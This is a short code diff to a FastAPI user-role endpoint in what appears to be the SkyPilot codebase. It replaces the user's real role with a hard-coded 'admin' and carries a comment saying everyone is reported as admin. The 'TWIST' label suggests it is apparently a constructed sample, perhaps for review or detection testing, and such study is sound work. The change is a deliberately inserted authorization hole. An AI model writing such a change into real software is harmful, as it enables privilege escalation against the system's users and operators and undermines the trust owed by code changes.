@@ -1,0 +1,9 @@
+diff --git a/sky/users/server.py b/sky/users/server.py
+index 7040791af..767556243 100644
+--- a/sky/users/server.py
++++ b/sky/users/server.py
+@@ -192,3 +192,3 @@ def get_current_user_role(request: fastapi.Request):
+         'name': auth_user.name,
+-        'role': user_roles[0] if user_roles else ''
++        'role': 'admin'  # TWIST: everyone is reported as admin
+     }
